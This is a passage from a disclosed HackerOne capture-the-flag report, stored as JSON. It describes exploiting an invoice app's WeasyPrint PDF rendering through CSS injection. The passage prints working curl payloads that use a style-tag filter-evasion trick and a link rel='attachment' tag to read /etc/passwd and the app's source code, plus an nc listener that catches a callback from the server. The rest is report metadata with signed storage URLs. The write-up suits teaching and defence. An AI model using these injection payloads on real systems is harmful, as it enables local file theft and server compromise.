href=\"/\"\u003eHome\u003c/a\u003e\n      \u003c/li\u003e\n      \u003cli  class=\"nav-item\" \u003e\n        \u003ca class=\"nav-link\" href=\"/reports\"\u003eReports\u003c/a\u003e\n      \u003c/li\u003e\n      \u003cli  class=\"nav-item active\" \u003e\n        \u003ca class=\"nav-link\" href=\"/invoices\"\u003eInvoices\u003c/a\u003e\n      \u003c/li\u003e\n      \u003c!--\u003cli  class=\"nav-item\" \u003e\n        \u003ca class=\"nav-link\" href=\"/invoices/new\"\u003eNew Invoice\u003c/a\u003e\n      \u003c/li\u003e--\u003e\n```\n\nWe can modify the Invoice data and then generate a HTML preview or a PDF. Investigating the parameters to the request. I investigated\nthe parameters to the request to see what we could modify and exploit.\n\n```json\n{\n    \"companyName\": \"Acme Tools\",\n    \"email\": \"accounting@acme.com\",\n    \"invoiceNumber\": \"0001\",\n    \"date\": \"2019-04-01\",\n    \"items\": [\n        [\"1\", \"Test\", \"Test\", \"10\"]\n    ],\n    \"styles\": {\n        \"body\": {\n            \"background-color\": \"white\"\n        }\n    }\n}\n```\n\nI tried modifying the CSS background property to a image which was hosted on a server controlled by me and I got a connect back.\n\n```sh\n## background: url('http://45.77.200.226:3002');\nroot@vultr:~# nc -l -v -p 3002\nListening on [0.0.0.0] (family 0, port 3002)\nConnection from 98.12.196.104.bc.googleusercontent.com 35548 received!\nGET / HTTP/1.1\nHost: 45.77.200.226:3002\nUser-Agent: WeasyPrint 44 (http://weasyprint.org/)\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: close\n```\n\nNow I know that the server is using the WeasyPrint library to convert the HTML to PDF. From here, I spent a lot of time on trying to mess with SVGs\nused in the background, and try to extract files out of the file system, but nothing worked.\n\nAfter giving up on the SVG track, I tried reading the source code of the WeasyPrint library to try and find something I could use. I found a feature that allowed\nme to insert attachments into the pdf.\n\n```py\n# https://github.com/Kozea/WeasyPrint/blob/master/weasyprint/html.py#L307\nelif element.tag == 'link' and element_has_link_type(\n        element, 'attachment'):\n    url = get_url_attribute(element, 'href', base_url)\n    title = element.get('title', None)\n    if url is None:\n        LOGGER.error('Missing href in \u003clink rel=\"attachment\"\u003e')\n    else:\n        attachments.append((url, title))\n```\n\nTo test my theory, I created a simple HTML file and converted it to a PDF using `WeasyPrint`.\n\n```sh\n$ cat test.html\n\u003clink rel=\"attachment\" href=\"file:///etc/passwd\"\u003e\n$ weasyprint test.html test.pdf -v\nINFO: Step 1 - Fetching and parsing HTML - test.html\nINFO: Step 3 - Applying CSS\nINFO: Step 4 - Creating formatting structure\nINFO: Step 5 - Creating layout - Page 1\nINFO: Step 6 - Drawing\nINFO: Step 7 - Adding PDF metadata\n```\n\nOpening the PDF in the browser, I found the `passwd` file in the attachments!\n\n{F439435}\n\n\nSo now if I could somehow inject a link tag into the HTML that was generated by preview, I would have LFI on the system.\nI tried searching for inputs that were not sanitized, and I found one in the attribute-name in the CSS styles.\n\n```html\n$ curl 'http://4eefcea7.ngrok.io/invoices/preview' -G --data-urlencode 'd={\"companyName\":\"\u003e\",\"email\":\"\u003e\",\"invoiceNumber\":\"\u003e\",\"date\":\"\u003e\",\"items\":[[\"1.5500\",\"\u003e\",\"\u003e\",\"10\"]],\"styles\":{\"\u003e\":{\"\u003e\":\"\u003e\"}}}'\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n...\n...\n...\n  \u003cstyle\u003e\n    .invoice-title h2, .invoice-title h3 {\n      display: inline-block;\n    }\n    .table \u003e tbody \u003e tr \u003e .no-line {\n      border-top: none;\n    }\n    .table \u003e thead \u003e tr \u003e .no-line {\n      border-bottom: none;\n    }\n    .table \u003e tbody \u003e tr \u003e .thick-line {\n      border-top: 2px solid;\n    }\n    \u0026gt; {\n      \u003e: \u0026gt;;\n    }\n  \u003c/style\u003e\n  \u003cdiv class=\"row\"\u003e\n    \u003cdiv class=\"col-xs-12\"\u003e\n      \u003cdiv class=\"invoice-title\"\u003e\n        \u003ch2\u003eInvoice\u003c/h2\u003e\u003ch3 class=\"pull-right\"\u003e# \u0026gt;\u003c/h3\u003e\n      \u003c/div\u003e\n      \u003chr\u003e\n      \u003cdiv class=\"row\"\u003e\n        \u003cdiv class=\"col-xs-6\"\u003e\n          \u003caddress\u003e\n            \u003cstrong\u003eBilled To:\u003c/strong\u003e\u003cbr\u003e\n            \u0026gt;\u003cbr\u003e\n            \u0026gt;\n          \u003c/address\u003e\n        \u003c/div\u003e\n      \u003c/div\u003e\n...\n...\n...\n```\n\nI tried to close the style tag, so that it would allow me to inject raw HTML, however the parser was completely filtering any closing tags.\nSo I used a common XSS filter evasion trick and wrapped the closing style tag with another closing style that: `\u003c/st\u003c/style\u003eyle\u003e`\nThat seemed to work.\n\nI used the injection to extract the `/app/main.py` file which should be the source code of the app.\n\n```\n$ curl 'http://4eefcea7.ngrok.io/invoices/preview' -G --data-urlencode 'd={\"companyName\":\"\u003e\",\"email\":\"\u003e\",\"invoiceNumber\":\"\u003e\",\"date\":\"\u003e\",\"items\":[[\"1.5500\",\"\u003e\",\"\u003e\",\"10\"]],\"styles\":{\"a\":{\"} \u003c/st\u003c/style\u003eyle\u003e \u003clink rel=''attachment'' href=''file:///app/main.py''\u003e \":\"a\"}}}'\n...\n...\n    a {\n      } \u003c/style\u003e \u003clink rel='attachment' href='file:///app/main.py'\u003e : a;\n    }\n  \u003c/style\u003e\n...\n...\n```\n\nThe preview looked good, and pdfize returned the pdf with the source code in the attachment!\n\n\n```py\n\"\"\"\nCONGRATULATIONS!\n\nIf you're reading this, you've made it to the end of the road for this CTF.\n\nGo to https://hackerone.com/50m-ctf and submit your write up, including as much detail as you can.\nMake sure to include 'c8889970d9fb722066f31e804e351993' in the report, so we know for sure you made it through!\n\nCongratulations again, and I'm sorry for the red herrings. :)\n\"\"\"\n\nfrom flask import Flask, abort, redirect, render_template, request, Response\nfrom jinja2 import Template\nfrom weasyprint import HTML\nimport base64, json, os, random, re\n```\n\n\nThanks for the great CTF! Even through it was a bit frustrating at times, I learnt a lot from it.\n\n## Impact\n\nI had shell on the machines, I also finished the CTF.","original_report_id":null,"original_report_url":null,"attachments":[{"id":439431,"file_name":"D0XoThpW0AE2r8S.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/431/cfe01f9a753eedf44f109caeda5182be92b81f94/D0XoThpW0AE2r8S.png?response-content-disposition=attachment%3B%20filename%3D%22D0XoThpW0AE2r8S.png%22%3B%20filename%2A%3DUTF-8%27%27D0XoThpW0AE2r8S.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ67VGDS6J%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150752Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIBUTJ%2BNbh3iGCDafndtBQHkqG1OchqwWgdsmguvhgcLdAiAZVuUXVW1VaXDOlTKJW4MkHKw5%2BpgOTsVzeaztjAVXniqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMAWL4B0QSi4hczgSpKtcD3VOAKPL2y75%2FC3vWJu4CxM2H0MhpokFUEt9l4V7Gq%2BkP2JZRIvSX1xKqm2Gk%2BJRjjqXa9QVImay%2FdjekrRmCYTSSDt9dxM0L0oVJr7N6F8ODRv2P7lMfnzU0QMlpmHbiPpiQb5vSlaxU6jX1ESO3u1VQpKIm%2B7BGH6YiJgHcf9pDdPJ24QxGmfk3jwQevnf60P1KEwb1KLJ2JtKpPhawQ8CP%2Fp%2B8Udd6EL0VEe2hP01M49Skdizp3cnpjBBz%2FKaJPQOVb%2FxLwhTaiAm4Gs7LWex0SieNQGn7QnS8LjaHWQ69N6yv2yl5daZ0uO8CMISq44OuSORn5NNfE6Wx49Y1QtLur%2BY0bpfImT2%2Bc3AvhGI16NMEhk5qpUfU2p6NU4IF0P6m2durenSRqQWtxyQafE31VSJU%2FhpOLcgkiLcYO84tTOPewOIMl9iBrNtCggjBX8%2FrEvRnKduv0F4uzhgiTrLXMqiHsoMRJfAlsnKSaskF2MN%2FW8oUK%2Fx2WHxpYJSGLi98vCnAnrjkI1O0VdepFdfxg4xzpi25EpMuF10ISO7%2BOVlPuH4gcxSmKXq2nnWHAyNBbYGCcXKMdnH%2BrKVSQO3JfLw8lTFoTNA9axFJVvLPV3N6%2FondMJKHkYsGOqYBXTEQgnOCUR6Njz81XybrbzJvU1Pc2hk4bMTrt1%2BCSeA%2FbFO392%2FoWlFJGmK4bl3JexiICV3H2r69Blx%2FAIbSxJ4%2Bl1Ric4x9veCmMmxtb3M7uvCDvG9rrJjEd5V99ttvzT1tURyLC0o%2FETycAhpeR4E%2BNiVWXOm1S8L2NA83yPbiobo0yaywdayHxWpEhNSXoJ8gkKAiNtIC0AZekCrrrdnKzbLEBw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=026a48c3f0ba616bf655ba160e51a64e737b5d472f988f4f38fec54e36821cd7","file_size":935868,"type":"image/png"},{"id":439432,"file_name":"tweet.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/432/a15822e09875f0ff7dbc8d3e5e9d72a52144db5d/tweet.png?response-content-disposition=attachment%3B%20filename%3D%22tweet.png%22%3B%20filename%2A%3DUTF-8%27%27tweet.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ67VGDS6J%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150752Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIBUTJ%2BNbh3iGCDafndtBQHkqG1OchqwWgdsmguvhgcLdAiAZVuUXVW1VaXDOlTKJW4MkHKw5%2BpgOTsVzeaztjAVXniqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMAWL4B0QSi4hczgSpKtcD3VOAKPL2y75%2FC3vWJu4CxM2H0MhpokFUEt9l4V7Gq%2BkP2JZRIvSX1xKqm2Gk%2BJRjjqXa9QVImay%2FdjekrRmCYTSSDt9dxM0L0oVJr7N6F8ODRv2P7lMfnzU0QMlpmHbiPpiQb5vSlaxU6jX1ESO3u1VQpKIm%2B7BGH6YiJgHcf9pDdPJ24QxGmfk3jwQevnf60P1KEwb1KLJ2JtKpPhawQ8CP%2Fp%2B8Udd6EL0VEe2hP01M49Skdizp3cnpjBBz%2FKaJPQOVb%2FxLwhTaiAm4Gs7LWex0SieNQGn7QnS8LjaHWQ69N6yv2yl5daZ0uO8CMISq44OuSORn5NNfE6Wx49Y1QtLur%2BY0bpfImT2%2Bc3AvhGI16NMEhk5qpUfU2p6NU4IF0P6m2durenSRqQWtxyQafE31VSJU%2FhpOLcgkiLcYO84tTOPewOIMl9iBrNtCggjBX8%2FrEvRnKduv0F4uzhgiTrLXMqiHsoMRJfAlsnKSaskF2MN%2FW8oUK%2Fx2WHxpYJSGLi98vCnAnrjkI1O0VdepFdfxg4xzpi25EpMuF10ISO7%2BOVlPuH4gcxSmKXq2nnWHAyNBbYGCcXKMdnH%2BrKVSQO3JfLw8lTFoTNA9axFJVvLPV3N6%2FondMJKHkYsGOqYBXTEQgnOCUR6Njz81XybrbzJvU1Pc2hk4bMTrt1%2BCSeA%2FbFO392%2FoWlFJGmK4bl3JexiICV3H2r69Blx%2FAIbSxJ4%2Bl1Ric4x9veCmMmxtb3M7uvCDvG9rrJjEd5V99ttvzT1tURyLC0o%2FETycAhpeR4E%2BNiVWXOm1S8L2NA83yPbiobo0yaywdayHxWpEhNSXoJ8gkKAiNtIC0AZekCrrrdnKzbLEBw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=4309b642f9aaa1c91f781bc2975add266d5de2023f853b395223ce84877f2fef","file_size":473992,"type":"image/png"},{"id":439433,"file_name":"jadx-overview.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/433/bf3df189e3b5b384a821356769d6b6a7a1452f91/jadx-overview.png?response-content-disposition=attachment%3B%20filename%3D%22jadx-overview.png%22%3B%20filename%2A%3DUTF-8%27%27jadx-overview.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ67VGDS6J%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150752Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIBUTJ%2BNbh3iGCDafndtBQHkqG1OchqwWgdsmguvhgcLdAiAZVuUXVW1VaXDOlTKJW4MkHKw5%2BpgOTsVzeaztjAVXniqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMAWL4B0QSi4hczgSpKtcD3VOAKPL2y75%2FC3vWJu4CxM2H0MhpokFUEt9l4V7Gq%2BkP2JZRIvSX1xKqm2Gk%2BJRjjqXa9QVImay%2FdjekrRmCYTSSDt9dxM0L0oVJr7N6F8ODRv2P7lMfnzU0QMlpmHbiPpiQb5vSlaxU6jX1ESO3u1VQpKIm%2B7BGH6YiJgHcf9pDdPJ24QxGmfk3jwQevnf60P1KEwb1KLJ2JtKpPhawQ8CP%2Fp%2B8Udd6EL0VEe2hP01M49Skdizp3cnpjBBz%2FKaJPQOVb%2FxLwhTaiAm4Gs7LWex0SieNQGn7QnS8LjaHWQ69N6yv2yl5daZ0uO8CMISq44OuSORn5NNfE6Wx49Y1QtLur%2BY0bpfImT2%2Bc3AvhGI16NMEhk5qpUfU2p6NU4IF0P6m2durenSRqQWtxyQafE31VSJU%2FhpOLcgkiLcYO84tTOPewOIMl9iBrNtCggjBX8%2FrEvRnKduv0F4uzhgiTrLXMqiHsoMRJfAlsnKSaskF2MN%2FW8oUK%2Fx2WHxpYJSGLi98vCnAnrjkI1O0VdepFdfxg4xzpi25EpMuF10ISO7%2BOVlPuH4gcxSmKXq2nnWHAyNBbYGCcXKMdnH%2BrKVSQO3JfLw8lTFoTNA9axFJVvLPV3N6%2FondMJKHkYsGOqYBXTEQgnOCUR6Njz81XybrbzJvU1Pc2hk4bMTrt1%2BCSeA%2FbFO392%2FoWlFJGmK4bl3JexiICV3H2r69Blx%2FAIbSxJ4%2Bl1Ric4x9veCmMmxtb3M7uvCDvG9rrJjEd5V99ttvzT1tURyLC0o%2FETycAhpeR4E%2BNiVWXOm1S8L2NA83yPbiobo0yaywdayHxWpEhNSXoJ8gkKAiNtIC0AZekCrrrdnKzbLEBw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=86c75d3667c7f6e322eaf96f08e4fcd79e63c2bbb770da48d54d4b3e64bd124a","file_size":58316,"type":"image/png"},{"id":439435,"file_name":"pdf_attachment.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/435/0feddf3550cbe094e67b80c3cf1df52465f5c138/pdf_attachment.png?response-content-disposition=attachment%3B%20filename%3D%22pdf_attachment.png%22%3B%20filename%2A%3DUTF-8%27%27pdf_attachment.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ67VGDS6J%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150752Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIBUTJ%2BNbh3iGCDafndtBQHkqG1OchqwWgdsmguvhgcLdAiAZVuUXVW1VaXDOlTKJW4MkHKw5%2BpgOTsVzeaztjAVXniqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMAWL4B0QSi4hczgSpKtcD3VOAKPL2y75%2FC3vWJu4CxM2H0MhpokFUEt9l4V7Gq%2BkP2JZRIvSX1xKqm2Gk%2BJRjjqXa9QVImay%2FdjekrRmCYTSSDt9dxM0L0oVJr7N6F8ODRv2P7lMfnzU0QMlpmHbiPpiQb5vSlaxU6jX1ESO3u1VQpKIm%2B7BGH6YiJgHcf9pDdPJ24QxGmfk3jwQevnf60P1KEwb1KLJ2JtKpPhawQ8CP%2Fp%2B8Udd6EL0VEe2hP01M49Skdizp3cnpjBBz%2FKaJPQOVb%2FxLwhTaiAm4Gs7LWex0SieNQGn7QnS8LjaHWQ69N6yv2yl5daZ0uO8CMISq44OuSORn5NNfE6Wx49Y1QtLur%2BY0bpfImT2%2Bc3AvhGI16NMEhk5qpUfU2p6NU4IF0P6m2durenSRqQWtxyQafE31VSJU%2FhpOLcgkiLcYO84tTOPewOIMl9iBrNtCggjBX8%2FrEvRnKduv0F4uzhgiTrLXMqiHsoMRJfAlsnKSaskF2MN%2FW8oUK%2Fx2WHxpYJSGLi98vCnAnrjkI1O0VdepFdfxg4xzpi25EpMuF10ISO7%2BOVlPuH4gcxSmKXq2nnWHAyNBbYGCcXKMdnH%2BrKVSQO3JfLw8lTFoTNA9axFJVvLPV3N6%2FondMJKHkYsGOqYBXTEQgnOCUR6Njz81XybrbzJvU1Pc2hk4bMTrt1%2BCSeA%2FbFO392%2FoWlFJGmK4bl3JexiICV3H2r69Blx%2FAIbSxJ4%2Bl1Ric4x9veCmMmxtb3M7uvCDvG9rrJjEd5V99ttvzT1tURyLC0o%2FETycAhpeR4E%2BNiVWXOm1S8L2NA83yPbiobo0yaywdayHxWpEhNSXoJ8gkKAiNtIC0AZekCrrrdnKzbLEBw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=648c680f68ca40a54bbcf623ba4ce527d5f4a04559556be4bb5911390ebd780f","file_size":33101,"type":"image/png"}],"allow_singular_disclosure_at":"2019-05-08T15:55:08.594Z","allow_singular_disclosure_after":-76633964.15641192,"singular_disclosure_allowed":true,"vote_count":7,"voters":["nytr0gen","checkm50","ali","globalenigma","seajay","kumbha","sampriti"],"severity":{"rating":"none","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4492850,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for the amazing report! We'll be announcing the winners shortly, so we'll let you know if you're one of the reports selected. Going to close this and then request public disclosure now.","automated_response":false,"created_at":"2019-04-05T18:34:33.541Z","updated_at":"2019-04-05T18:34:33.541Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"sampriti","url":"/sampriti"},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509087,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-04-08T15:55:08.566Z","updated_at":"2019-04-08T15:55:08.566Z","first_to_agree":true,"actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509088,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","automated_response":false,"created_at":"2019-04-08T15:55:17.020Z","updated_at":"2019-04-08T15:55:17.020Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}